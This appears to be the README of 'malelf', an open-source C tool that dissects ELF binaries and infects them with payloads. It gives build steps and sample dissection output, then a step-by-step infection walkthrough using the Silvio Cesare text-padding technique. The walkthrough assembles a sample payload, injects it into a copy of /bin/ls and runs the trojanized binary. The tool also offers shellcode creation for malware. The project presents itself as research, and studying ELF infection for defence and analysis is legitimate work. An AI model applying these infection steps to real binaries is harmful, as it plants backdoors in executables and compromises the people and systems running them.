malelf
======

Malelficus program to dissect and infect ELF binaries.

With malelf you can:

    * infect/backdoorize ELF binaries;
    * dissect ELF data structures;
    * Report ELF data structures in text or xml;
    * Disassembly sections;
    * Create payloads/shellcode to malwares;
    * Dynamic analysis (experimental)

The malelf tool is part of malelficus project and is under active
development. The libmalelf and malelf is far from complete but the
basic features are already working as expected.

*We are not responsible for any damage caused by using this tool. It was created with the sole purpose of research. It's a proof of concept that unix systems can also be the target of malware.*

Dependencies
=============

malelf depends solely of the libmalelf. If you haven't installed it in
your system, go to the github libmalelf page and install it.

    https://github.com/SecPlus/libmalelf


Building and Installing
========================

The tool is written in pure C, so the build process is very simple.

First, get the source:

    $ git clone https://github.com/SecPlus/malelf.git

Then build:

    $ ./configure --prefix=/usr
    $ make

Install (are you sure ? =P)

    $ sudo make install


Usage
=======

    $ malelf

    Tool to infect and/or analyse ELF binary.
    Usage: malelf <command> [-h] <options>
    Commands:
    dissect 	Show ELF binary info.
    disas   	Disassembly binary ELF in NASM compatible format.
    infect 	Infect the binary with a malware.
    shellcode 	create the virus shellcode in the proper format
    to use with the infect command.
    dynanalyse 	Dinamically analyse the ELF binary for malwares.

For each malelf command has a -h/--help option for more details of usage.

Dissect
=========

The dissect ELF header of /bin/bash use:

    $ malelf dissect -h
    This command display information about the ELF binary.
    Usage: malelf dissect <options>
    -h, --help    	Dissect Help
    -i, --input   	Binary File
    -e, --ehdr    	Display ELF Header
    -s, --shdr    	Display Section Header Table
    -p, --phdr    	Display Program Header Table
    -S, --stable  	Display Symbol Table
    -f, --format  	Output Format (XML or Stdout). Default is Stdout.
    -o, --output  	Output File.
    Example: malelf dissect -i /bin/ls -f xml -o /tmp/binary.xml

    $ malelf dissect -i /bin/bash --ehdr
    +-----------------------------------------------------------------------------+
    |                                  ELF Header                                 |
    +------------------------+------------------------------+---------------------+
    |   Structure Member     |         Description          |        Value        |
    +------------------------+------------------------------+---------------------+
    |        e_type          |         Object Type          |   Executable file   |
    |       e_version        |           Version            |          1          |
    |        e_entry         |         Entry Point          |     0x08064678      |
    |        e_phoff         |         PHT Offset           |     0x00000034      |
    |        e_shoff         |         SHT Offset           |     0x000e5864      |
    |       e_ehsize         |       ELF Header Size        |         52          |
    |      e_phentsize       |     Size of PHT entries      |         32          |
    |        e_phnum         |    Number of PHT entries     |          9          |
    |      e_shentsize       |  Size of one entry in SHT    |         40          |
    |        e_shnum         |     Number of sections       |         28          |
    |      e_shstrndx        |      SHT symbol index        |         27          |
    +------------------------+------------------------------+---------------------+

To get the Program Header Table report in XML into the file bash_phdr.xml use:

    $ malelf dissect -i /bin/bash --phdr -f xml -o ./bash_phdr.xml
    $ cat bash_phdr.xml
	<?xml version="1.0" encoding="UTF8"?>
	<MalelfBinary>
	  <MalelfPhdr>
	    <type>6</type>
	    <offset>0x00000034</offset>
	    <vaddr>0x08048034</vaddr>
	    <paddr>0x08048034</paddr>
	    <filesz>288</filesz>
	    <memsz>288</memsz>
	    <flags>5</flags>
	    <align>4</align>
	  </MalelfPhdr>
	  <MalelfPhdr>
	    <type>3</type>
	    <offset>0x00000154</offset>
	    <vaddr>0x08048154</vaddr>
	    <paddr>0x08048154</paddr>
	    <filesz>19</filesz>
	    <memsz>19</memsz>
	    <flags>4</flags>
	    <align>1</align>
	  </MalelfPhdr>
	  <MalelfPhdr>
	    <type>1</type>
	    <offset>0x00000000</offset>
	    <vaddr>0x08048000</vaddr>
	    <paddr>0x08048000</paddr>
	    <filesz>918728</filesz>
	    <memsz>918728</memsz>
	    <flags>5</flags>
	    <align>4096</align>
	  </MalelfPhdr>
	  <MalelfPhdr>
	    <type>1</type>
	    <offset>0x000e0ee4</offset>
	    <vaddr>0x08129ee4</vaddr>
	    <paddr>0x08129ee4</paddr>
	    <filesz>18576</filesz>
	    <memsz>38976</memsz>
	    <flags>6</flags>
	    <align>4096</align>
	  </MalelfPhdr>
	  <MalelfPhdr>
	    <type>2</type>
	    <offset>0x000e0ef0</offset>
	    <vaddr>0x08129ef0</vaddr>
	    <paddr>0x08129ef0</paddr>
	    <filesz>256</filesz>
	    <memsz>256</memsz>
	    <flags>6</flags>
	    <align>4</align>
	  </MalelfPhdr>
	  <MalelfPhdr>
	    <type>4</type>
	    <offset>0x00000168</offset>
	    <vaddr>0x08048168</vaddr>
	    <paddr>0x08048168</paddr>
	    <filesz>68</filesz>
	    <memsz>68</memsz>
	    <flags>4</flags>
	    <align>4</align>
	  </MalelfPhdr>
	  <MalelfPhdr>
	    <type>1685382480</type>
	    <offset>0x000c82b8</offset>
	    <vaddr>0x081102b8</vaddr>
	    <paddr>0x081102b8</paddr>
	    <filesz>15524</filesz>
	    <memsz>15524</memsz>
	    <flags>4</flags>
	    <align>4</align>
	  </MalelfPhdr>
	  <MalelfPhdr>
	    <type>1685382481</type>
	    <offset>0x00000000</offset>
	    <vaddr>0x00000000</vaddr>
	    <paddr>0x00000000</paddr>
	    <filesz>0</filesz>
	    <memsz>0</memsz>
	    <flags>6</flags>
	    <align>4</align>
	  </MalelfPhdr>
	  <MalelfPhdr>
	    <type>1685382482</type>
	    <offset>0x000e0ee4</offset>
	    <vaddr>0x08129ee4</vaddr>
	    <paddr>0x08129ee4</paddr>
	    <filesz>284</filesz>
	    <memsz>284</memsz>
	    <flags>4</flags>
	    <align>1</align>
	  </MalelfPhdr>
	</MalelfBinary>


Infect
=========

This feature isn't black magic, anyone with basic knowledge of ELF internals
can do this by yourself. There are many techniques that can be used to infect
ELF binaries, but the malelficus has only one implemented for now, the
silvio cesare text-padding.

To infect a ELF binary with this technique and malelf is very simple, but
first we need the malware payload (or shellcode). Because of legal issues
we cannot share our dataset of unix malwares for sample, but among with the
project has a sample directory with basic assembly files that you can rely
on it.

First we need the malware payload assembled, for this example let's use the
samples/message32.asm

    $ cd samples/
    $ nasm -f bin message32.asm -o message32.bin

For now, you can infect your /bin/ls with the following command:

    $ malelf infect -h
    This command is used to assist in the process of binary infection.
    Usage: malelf infect <options>
    -h, --help    		Infect Help
    -i, --input   		Input host file
    -o, --output  		Output infected file
    -m, --malware 		FLAT binary malware.
    -f, --offset-return	Offset in shellcode to patch the host entrypoint
    -a, --auto-shellcode	Automatically patch shellcode with host entrypoint
    -t, --technique  	Technique to infect.
    -l, --list       	List techniques.
    Example: malelf infect -i /bin/ls -o myls -m evil.bin -t 'silvio-text-padding'

    $ malelf infect -i /bin/ls -o ./myls -m ./message32.bin -t silvio-text-padding -a
    [+] Infecting by silvio cesare technique (text-padding)
    [+] binary input: '/bin/ls', size: 112700 bytes
    [+] binary output: './myls'
    [+] malware payload: './message32.bin', size: 48 bytes

    [+] Payload shellcode automatically created, magic bytes at '0x0031'
    [+] Successfully infected.

Successfully infected =)
To test, run your local infected ls:

    $ ./myls
    OWNED BY I4K
    backdoor.asm  backdoor.bin  daniel-ls  message32.asm  message32.bin  message64.asm
    myls  syscall.inc.asm  util.inc.asm

=)

To get all infect techniques available use:

    $ malelf infect -l
    List of infect techniques supported:

	0 - silvio-text-padding

But at the moment, only the basic silvio text padding is ready to use.

That's all !

More info:
Documentation (only portuguese ...)
http://secplus.github.io/malelficus/documentation/
http://www.slideshare.net/tiagonatel/desenvolvimento-de-malware
http://hemingway.softwarelivre.org/fisl14/high/41d/sala41d-high-201307061559.ogg

Soon we will have more documentation here and other interesting features of the tool.

SEC+ Team
